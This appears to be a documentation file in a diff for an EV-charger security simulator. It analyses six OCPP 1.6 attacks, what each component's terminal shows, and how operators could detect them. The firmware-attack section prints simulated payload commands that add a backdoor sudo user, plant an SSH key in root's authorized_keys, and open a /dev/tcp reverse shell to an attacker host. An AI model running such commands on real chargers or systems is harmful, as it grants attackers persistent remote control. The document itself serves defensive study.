@@ -1,0 +1,400 @@
+EVSecSim — Attack Log Analysis
+================================
+What each terminal shows, why it shows it, and what an operator can and
+cannot detect from each vantage point.
+
+This document covers all eight profiles in order: normal baseline, then
+Attacks 1–6.  For each profile the container topology is shown first,
+followed by a per-terminal breakdown.
+
+================================================================================
+GENERAL PRINCIPLE
+================================================================================
+
+Every terminal only sees what OCPP messages arrive at its own socket.
+No component has out-of-band visibility into another container's process.
+The attacker's terminal always shows the most because it either controls
+one endpoint or sits between the two endpoints.
+
+OCPP 1.6 uses plaintext WebSocket with no message signing, no transport
+encryption, and no connection authentication.  This means:
+
+  - The CSMS cannot verify that a reported MeterValue is accurate.
+  - The CSMS cannot verify that a BootNotification is from a real charger.
+  - Neither endpoint can detect a proxy sitting between them.
+  - The EVSE cannot verify that a CSMS command comes from a legitimate operator.
+
+All six attack categories exploit one or more of these absences.
+
+================================================================================
+NORMAL BASELINE  (profile: normal)
+================================================================================
+
+Topology
+--------
+  evse (172.19.0.20, operator-net)  ──────────────►  csms (172.19.0.10)
+
+Terminal: csms
+  Shows : "Connected: CP_1", BootNotification vendor/model, "Power = 60 kW"
+  Why   : Receives every OCPP frame the EVSE sends directly.  No proxy,
+          no tampering — this is the ground truth view.
+
+Terminal: evse
+  Shows : "Boot Response: Accepted", "OCPP sending: 60 kW to connector N"
+  Why   : The EVSE drives its own pandapower grid simulation and reports
+          results upward.  It sees ACKs coming back from the CSMS.
+
+Both sides see the full picture because nothing sits between them.
+
+================================================================================
+ATTACK 1 — SaiFlow Denial-of-Service  (profile: saiflow)
+================================================================================
+
+Topology
+--------
+  evse (172.19.0.20, operator-net)  ──────────────►  csms (172.19.0.10)
+  atk-saiflow (172.20.0.30, public-net)  ──────────►  csms (172.19.0.10)
+
+Both clients use the same CP identity "CP_1".  atk-saiflow connects via
+public-net; evse connects via operator-net.  The CSMS is dual-homed so it
+accepts both.
+
+Terminal: csms
+  Shows : Two separate "Connected: CP_1" lines, two BootNotifications
+          (one from Vendor/Model1, one from RogueVendor/RogueCP-v1.0),
+          then Heartbeat responses flooding the log.
+  Why   : The CSMS has no CP registry and no duplicate-connection guard.
+          Each WebSocket arrival spawns an independent asyncio handler
+          regardless of CP ID.  Both sessions run in parallel — the CSMS
+          cannot determine which is legitimate.
+
+Terminal: evse
+  Shows : Continues sending MeterValues normally.
+  Why   : The legitimate EVSE's socket to the CSMS is still alive and
+          being processed.  The impact is session shadowing (two CP_1
+          instances active simultaneously), not a communication blackout.
+          The EVSE is entirely unaware a rogue client exists.
+
+Terminal: atk-saiflow
+  Shows : Rogue BootNotification accepted, flood stats (~280 HB/s),
+          monitor CP MeterValues, final summary after 60 s.
+  Why   : The attack script drives everything from its side.  It receives
+          CSMS ACKs because the CSMS now routes CP_1 responses to whichever
+          socket sent the most recent message — the rogue one.
+
+Operator detection gap
+  The CSMS log shows two identical CP IDs connecting but has no alert or
+  reject logic for this condition.  A human watching the log would see the
+  duplicate, but an automated system without dedup rules would not flag it.
+
+================================================================================
+ATTACK 2 — False Data Injection  (profile: fdi)
+================================================================================
+
+Topology
+--------
+  evse-via-fdi (172.19.0.30)  ──── attack_fdi.py acting as EVSE ──►  csms (172.19.0.10)
+
+There is no separate legitimate EVSE in this profile.  The attack script
+itself connects to the CSMS and plays the role of a compromised charger.
+
+Terminal: csms
+  Shows : Phase 1: "Power = 60 kW" / "Power = 0 kW" (alternating, accurate)
+          Phase 2: "Power = 0 kW" repeatedly  (charger is drawing 60 kW)
+          Phase 3: "Power = 999 kW" repeatedly  (charger is idle)
+  Why   : The CSMS receives whatever value the compromised EVSE chooses to
+          send.  MeterValues in OCPP 1.6 are unsigned and unverified.
+          The CSMS has no reference to compare against — it blindly trusts
+          the charger's report.
+
+Terminal: evse-via-fdi
+  Shows : Side-by-side table: real= / reported= for every interval, with
+          "HIDING N kW from operator" or "FAKING N kW phantom load" labels.
+  Why   : The attack script knows both values because it controls the
+          process — it decides what to report independently of what it
+          "actually" draws.  The "real" value never travels over OCPP;
+          it is a local variable printed for demo clarity.
+
+Operator detection gap
+  The CSMS log alone gives no indication that Phase 2 or Phase 3 values
+  are fabricated.  They look identical in format to legitimate MeterValues.
+  Detection requires an out-of-band cross-reference: a substation smart
+  meter, SCADA reading, or plausibility ceiling check on the CSMS side.
+
+================================================================================
+ATTACK 3a — MITM WebSocket Proxy, Internal  (profile: mitm)
+================================================================================
+
+Topology
+--------
+  evse-via-mitm (172.19.0.50)
+      |
+      |  ws://atk-mitm:9001
+      ▼
+  atk-mitm (172.19.0.40)   ← proxy: reads, modifies, injects
+      |
+      |  ws://csms:9000
+      ▼
+  csms (172.19.0.10)
+
+Terminal: csms
+  Phase 1 (0–10 s): "Power = 60 kW"  (forwarded unmodified)
+  Phase 2 (10–20 s): "Power = 999 kW"  (real value was ~60 kW, tampered in transit)
+  Phase 3 (20 s+):
+    "STOPTRANSACTION received from: CP_1"
+    "meter_stop : 0 Wh  (billing corrupted)"
+    "SESSION TERMINATED"
+  Why   : The CSMS receives the proxy's modified or injected frames.  It
+          cannot distinguish them from genuine EVSE messages.  The source
+          of the TCP connection is the proxy (172.19.0.40), but OCPP 1.6
+          carries no per-message origin field.
+
+Terminal: evse-via-mitm
+  Shows : Normal "OCPP sending: 60 kW" throughout all three phases.
+          Never prints anything about tampering or injection.
+  Why   : The EVSE is connected to the proxy, not the CSMS.  The proxy
+          relays valid CSMS ACKs back to the EVSE for every message it
+          sends — including after StopTransaction is injected.  The EVSE
+          receives a correct CallResult and believes the session is normal.
+          It has no cryptographic way to detect the proxy's presence.
+
+Terminal: atk-mitm
+  Shows : Every message in both directions with [E→C] / [C→E] labels,
+          "TAMPERED #N: real=60 kW → csms sees=999 kW",
+          "INJECTING FORGED StopTransaction", uid and meterStop fields.
+  Why   : The proxy processes every raw WebSocket frame before forwarding.
+          It has full visibility of both sides simultaneously — no endpoint
+          can see this combined view.
+
+Operator detection gap
+  Neither the CSMS log nor the EVSE log contains any anomaly during Phases
+  1 and 2.  Phase 3 produces a StopTransaction in the CSMS log, but it
+  looks legitimate — same CP ID, valid JSON structure.  The only indicator
+  is meterStop=0 Wh, which is unusual but not impossible.  A pcap on both
+  ports 9000 and 9001 would show the MeterValues value changing between
+  the two streams.
+
+================================================================================
+ATTACK 3b — MITM WebSocket Proxy, External  (profile: mitm-ext)
+================================================================================
+
+Topology
+--------
+  evse-via-mitm-ext (172.20.0.50, public-net)
+      |
+      |  ws://atk-mitm-ext:9002
+      ▼
+  atk-mitm-ext (172.20.0.30, public-net)   ← proxy on WAN path
+      |
+      |  ws://csms:9000
+      ▼
+  csms (172.19.0.10, dual-homed)
+
+Terminal behaviour is identical to Attack 3a.  The distinction is:
+  - The proxy and the compromised EVSE are both on public-net.
+  - The attacker has zero access to operator-net.
+  - The attack is achieved entirely by intercepting the WAN path to a
+    cloud-hosted CSMS — models BGP hijacking, DNS poisoning, or a rogue
+    cloud reverse proxy.
+
+The CSMS log shows the same tampered values and injected StopTransaction.
+The EVSE log shows the same clean operation.  Only the source IP differs
+in a pcap capture.
+
+================================================================================
+ATTACK 4 — Coordinated Load Altering  (profile: load)
+================================================================================
+
+Topology
+--------
+  atk-load (172.20.0.40, public-net)
+    ├── BOT_001  ──────────────────────►  csms:9000 (172.19.0.10)
+    ├── BOT_002  ──────────────────────►  csms:9000
+    │   ...
+    └── BOT_010  ──────────────────────►  csms:9000
+
+No EVSE container exists in this profile.  The botnet replaces all EVSEs.
+
+Terminal: csms
+  Shows : 10 "Connected: BOT_NNN" entries, 10 BootNotifications from
+          "BotFleet-Vendor / BotCP-220kW", then simultaneous bursts of
+          "Power = 220 kW" (surge) or "Power = 0 kW" (drop) from all
+          10 bots at the same second.
+  Why   : The CSMS accepts every WebSocket connection with no authentication
+          and no rate limiting.  Each BOT_NNN is treated as a legitimate
+          charger.  There is no mechanism to detect coordinated behaviour
+          across sessions.
+
+Terminal: atk-load
+  Shows : Bot registration count, per-phase ticks with mode labels
+          (SURGE / DROP / MAX▲ / ZERO▼), pandapower power flow results
+          after each phase (EV load MW, 22kV voltage pu, transformer
+          loading %, estimated frequency deviation Hz), final summary table.
+  Why   : The attack script orchestrates all 10 bots locally with asyncio
+          and runs the grid twin inside the same process.  The grid
+          simulation computes real electrical impact from the coordinated
+          load change.  None of this computation is visible to the CSMS —
+          it only sees MeterValues.
+
+Operator detection gap
+  The CSMS log shows all 10 bots connecting and reporting power, but
+  nothing flags the coordination.  An operator would need fleet-level
+  anomaly detection: a rule that fires when N chargers change load
+  simultaneously by more than a threshold.
+
+================================================================================
+ATTACK 5 — Malicious Firmware Update  (profile: firmware)
+================================================================================
+
+Topology
+--------
+  evse-via-firmware (172.19.0.60)
+      |
+      |  ws://atk-firmware:9000   (ROGUE CSMS — real csms NOT started)
+      ▼
+  atk-firmware (172.19.0.30)
+      └── HTTP server on :8080  serves  /firmware.sh  (malicious payload)
+
+There is no real CSMS in this profile.  atk-firmware impersonates one.
+
+Terminal: atk-firmware  (rogue CSMS + payload server)
+  Shows : BootNotification received and accepted, "Waiting 10s before
+          pushing malicious firmware", UpdateFirmware sent with the
+          attacker-controlled HTTP URL, HTTP 200 delivery confirmed,
+          FirmwareStatusNotification sequence:
+            Downloading → Downloaded → Installing → Installed
+          "PAYLOAD INSTALLED — EVSE FULLY COMPROMISED" banner.
+  Why   : This is the attacker's view.  It receives the four OCPP status
+          callbacks the EVSE sends back over the WebSocket.  The actual
+          shell commands that execute on the charger are invisible to it
+          over OCPP — only the enum status arrives.
+
+Terminal: evse-via-firmware  (victim charger)
+  Shows : UpdateFirmware received (no signature check logged), full
+          payload script printed (1069 bytes downloaded over HTTP),
+          simulated shell execution:
+            $ useradd -m -s /bin/bash backdoor
+            $ echo 'backdoor:EV$ecr3t!' | chpasswd
+            $ usermod -aG sudo backdoor
+            $ mkdir -p /root/.ssh && chmod 700 /root/.ssh
+            $ echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
+            $ nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &
+            $ id backdoor
+              uid=1001(backdoor) gid=1001(backdoor) groups=1001(backdoor),27(sudo)
+          "EVSE FULLY COMPROMISED" banner.
+  Why   : The firmware download and execution happen entirely on the
+          charger.  The EVSE is the victim — it shows what a real
+          compromised charger would do locally.  None of the shell output
+          is transmitted over OCPP; the OCPP channel carries only the four
+          FirmwareStatus enum values.  The simulation prints the execution
+          output locally to make the compromise visible in the demo.
+
+Real CSMS
+  Not started.  In the real-world threat model the attacker has either
+  replaced the CSMS or poisoned DNS so the EVSE connects to the rogue
+  server instead.
+
+Operator detection gap
+  If the real CSMS were running, it would see nothing unusual — the EVSE
+  would be connected to the rogue server, not to the operator's CSMS, so
+  no OCPP messages would arrive at all.  The only observable anomaly from
+  the operator side is a charger going offline (no Heartbeat to the real
+  CSMS), which could be mistaken for a network fault.
+
+================================================================================
+ATTACK 6 — Duration Spoofing  (profile: duration-spoof)
+================================================================================
+
+Topology
+--------
+  evse-via-duration-spoof (172.19.0.61)
+      |
+      |  ws://atk-duration-spoof:9003
+      ▼
+  atk-duration-spoof (172.19.0.41)   ← proxy: drops StopTransaction, injects ghost
+      |
+      |  ws://csms:9000
+      ▼
+  csms (172.19.0.10)
+
+Terminal: csms
+  Phase 1 (real session):
+    "StartTransaction: connectorId=1 … → txId=1"
+    "Power = 34 kW", "Power = 41 kW"   (real pandapower values)
+  Phase 2 (ghost session — EVSE already physically gone):
+    "Power = 60 kW"  repeated every 10 s   (phantom, injected by proxy)
+    "Power = 60 kW"  ...
+  End of ghost:
+    "STOPTRANSACTION received from: CP_1"
+    "meter_stop : 181002 Wh"   (inflated by phantom energy)
+    "SESSION TERMINATED — billing closed at 181002 Wh"
+  Why   : The CSMS receives the proxy's phantom MeterValues after the
+          EVSE disconnects and has no mechanism to detect the physical
+          absence of the car.  OCPP 1.6 has no pilot-signal channel or
+          liveness probe tied to the physical connector state.  Each
+          incoming MeterValues frame is indistinguishable from a legitimate
+          one.
+
+Terminal: evse-via-duration-spoof
+  Shows : Normal session, "MeterValues: N Wh (t=Ns)" counting up,
+          "Session duration 20s elapsed — sending StopTransaction",
+          "StopTransaction ACK received — session ended cleanly".
+          Then exits with code 0.
+  Why   : The EVSE receives a forged OCPP CallResult for its StopTransaction
+          — the proxy generated a correctly formatted ACK at the moment it
+          intercepted the frame.  OCPP has no message signing so the EVSE
+          cannot tell the ACK was not from the real CSMS.  It believes the
+          session closed normally and is completely unaware of the ghost
+          phase.
+
+Terminal: atk-duration-spoof
+  Shows : Transparent relay during Phase 1 with [E→C]/[C→E] labels,
+          "PHASE 2 — StopTransaction INTERCEPTED AND DROPPED",
+          transactionId, meterStop (real final reading),
+          "Forged StopTransaction ACK sent to EVSE",
+          "PHASE 3 — GHOST SESSION ACTIVE",
+          "Phantom MeterValues #1: N Wh (+166 Wh phantom energy)",
+          "Phantom MeterValues #2: ...",
+          "Ghost ended — X kWh phantom energy injected",
+          "Final StopTransaction: meterStop=N Wh (includes phantom energy)".
+  Why   : The proxy processes every frame from both sides.  It is the only
+          component with full visibility: it sees the real StopTransaction
+          from the EVSE before dropping it, generates both the forged ACK
+          and the synthetic MeterValues, and tracks the phantom energy
+          accumulation.
+
+Operator detection gap
+  The CSMS log shows a charging session that appears normal throughout.
+  The anomaly is only detectable by:
+    (a) Comparing the MeterValues interval cadence — real ones come from
+        the pandapower sim at variable timing; phantom ones arrive at a
+        fixed 10 s interval.
+    (b) Noticing that Heartbeat messages from the EVSE stop at the same
+        instant that the EVSE physically disconnects, while MeterValues
+        keep arriving.
+    (c) Cross-referencing the reported meterStop against the smart meter
+        at the substation.
+  None of these checks are mandated by OCPP 1.6.
+
+================================================================================
+SUMMARY TABLE
+================================================================================
+
+Attack  | Who the CSMS thinks it sees  | What the CSMS cannot see
+--------|------------------------------|-------------------------------------
+1       | Two CP_1 sessions (no alert) | Which session is rogue
+2       | Accurate-looking MeterValues | The real power draw
+3a/3b   | Legitimate CP_1 session      | Tampered values; forged StopTx
+4       | 10 legitimate EVSEs          | Coordinated control; grid impact
+5       | Nothing (EVSE connected to   | The payload executed on the charger
+        | rogue CSMS instead)          |
+6       | Active session post-EV-gone  | Physical disconnect; phantom energy
+
+Attack  | Who the EVSE thinks it sees  | What the EVSE cannot see
+--------|------------------------------|-------------------------------------
+1       | Normal CSMS responses        | Shadow session in CSMS
+2       | N/A (EVSE is the attacker)   | N/A
+3a/3b   | Normal CSMS responses        | Proxy; tampered outbound messages
+4       | N/A (bots, no victim EVSE)   | N/A
+5       | A legitimate CSMS            | Rogue identity; malicious payload
+6       | Normal CSMS responses        | StopTx dropped; ghost phase
